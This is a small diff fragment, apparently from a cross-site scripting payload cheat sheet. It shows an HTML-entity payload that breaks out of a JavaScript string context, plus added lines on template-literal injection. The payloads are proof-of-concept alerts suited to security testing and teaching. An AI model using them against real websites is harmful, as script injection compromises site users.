@@ -31,3 +31,9 @@ using HTML entity to bypass context :
 
 &apos;-alert(document.domain)-&apos;
 
+//the apos sequence is an HTML entity representing an aprostrophe or single quote
+
+TEMPLATE LITERALS  ``
+
+${arbituary_js_code_here}
+
